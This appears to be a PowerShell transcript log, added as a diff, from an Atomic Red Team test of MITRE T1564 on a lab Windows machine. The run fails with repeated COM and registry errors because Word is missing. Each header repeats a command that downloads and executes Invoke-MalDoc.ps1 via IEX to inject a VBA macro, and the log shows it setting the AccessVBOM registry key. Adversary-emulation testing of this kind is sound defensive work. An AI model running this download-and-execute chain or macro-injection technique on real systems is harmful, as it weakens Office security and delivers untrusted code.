@@ -1,0 +1,557 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170149
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+PS>TerminatingError(New-Object):“检索 COM 类工厂中 CLSID 为 {00000000-0000-0000-0000-000000000000} 的组件失败，原因是出现以下错误: 80040154 没有注册类 (异常来自 HRESULT:0x80040154 (REGDB_E_CLASSNOTREG))。”
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170151
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“检索 COM 类工厂中 CLSID 为 {00000000-0000-0000-0000-000000000000} 的组件失败，原因是出现以下错误: 80040154 没有注册类 (异常来自 HRESULT:0x80040154 (REGDB_E_CLASSNOTREG))。”
+New-Object : 检索 COM 类工厂中 CLSID 为 {00000000-0000-0000-0000-000000000000} 的组件失败，原因是出现以下错误: 80040154 没有注册类 (异常来自 HRESULT:0x
+80040154 (REGDB_E_CLASSNOTREG))。
+所在位置 行:70 字符: 12
++     $app = New-Object -ComObject "$officeProduct.Application"
++            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [New-Object], COMException
+    + FullyQualifiedErrorId : NoCOMClassIdentified,Microsoft.PowerShell.Commands.NewObjectCommand
+New-Object : 检索 COM 类工厂中 CLSID 为 {00000000-0000-0000-0000-000000000000} 的组件失败，原因是出现以下错误: 80040154 没有注册类 (异常来自 HRESULT:0x
+80040154 (REGDB_E_CLASSNOTREG))。
+所在位置 行:70 字符: 12
++     $app = New-Object -ComObject "$officeProduct.Application"
++            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [New-Object], COMException
+    + FullyQualifiedErrorId : NoCOMClassIdentified,Microsoft.PowerShell.Commands.NewObjectCommand
+New-Object : 检索 COM 类工厂中 CLSID 为 {00000000-0000-0000-0000-000000000000} 的组件失败，原因是出现以下错误: 80040154
+ 没有注册类 (异常来自 HRESULT:0x80040154 (REGDB_E_CLASSNOTREG))。
+所在位置 行:70 字符: 12
++     $app = New-Object -ComObject "$officeProduct.Application"
++            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [New-Object], COMException
+    + FullyQualifiedErrorId : NoCOMClassIdentified,Microsoft.PowerShell.Commands.NewObjectCommand
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170151
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“指定路径下的注册表项不存在。”
+New-Item : 指定路径下的注册表项不存在。
+所在位置 行:73 字符: 34
++     if (-not (Test-Path $key)) { New-Item $Key }
++                                  ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...oft\Office\Word:String) [New-Item]，ArgumentException
+    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand
+New-Item : 指定路径下的注册表项不存在。
+所在位置 行:73 字符: 34
++     if (-not (Test-Path $key)) { New-Item $Key }
++                                  ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...oft\Office\Word:String) [New-Item]，ArgumentException
+    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand
+New-Item : 指定路径下的注册表项不存在。
+所在位置 行:73 字符: 34
++     if (-not (Test-Path $key)) { New-Item $Key }
++                                  ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...oft\Office\Word:String) [New-Item]，ArgumentException
+    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170151
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“找不到路径“HKCU:\Software\Microsoft\Office\Word\Security\”，因为该路径不存在。”
+Set-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Office\Word\Security\”，因为该路径不存在。
+所在位置 行:74 字符: 5
++     Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\Word\Security\:String) [Set-ItemProperty], ItemNotFoun
+dException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand
+Set-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Office\Word\Security\”，因为该路径不存在。
+所在位置 行:74 字符: 5
++     Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\Word\Security\:String) [Set-ItemProperty], ItemNotFoun
+dException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand
+Set-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Office\Word\Security\”，因为该路径不存在。
+所在位置 行:74 字符: 5
++     Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\Word\Security\:String) [Set-ItemProperty], ItemNotFo
+   undException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:84 字符: 9
++         $doc = $app.Documents.Add()
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:84 字符: 9
++         $doc = $app.Documents.Add()
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:84 字符: 9
++         $doc = $app.Documents.Add()
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:89 字符: 5
++     $comp = $doc.VBProject.VBComponents.Add(1)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:89 字符: 5
++     $comp = $doc.VBProject.VBComponents.Add(1)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:89 字符: 5
++     $comp = $doc.VBProject.VBComponents.Add(1)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:90 字符: 5
++     $comp.CodeModule.AddFromString($macroCode)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:90 字符: 5
++     $comp.CodeModule.AddFromString($macroCode)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:90 字符: 5
++     $comp.CodeModule.AddFromString($macroCode)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:91 字符: 5
++     $app.Run($sub)
++     ~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:91 字符: 5
++     $app.Run($sub)
++     ~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:91 字符: 5
++     $app.Run($sub)
++     ~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:92 字符: 5
++     $doc.Close(0)
++     ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:92 字符: 5
++     $doc.Close(0)
++     ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:92 字符: 5
++     $doc.Close(0)
++     ~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“不能对 Null 值表达式调用方法。”
+不能对 Null 值表达式调用方法。
+所在位置 行:93 字符: 5
++     $app.Quit()
++     ~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:93 字符: 5
++     $app.Quit()
++     ~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+不能对 Null 值表达式调用方法。
+所在位置 行:93 字符: 5
++     $app.Quit()
++     ~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。””
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:94 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:94 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:94 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。””
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:95 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc)  ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:95 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc)  ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:95 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc)  ...
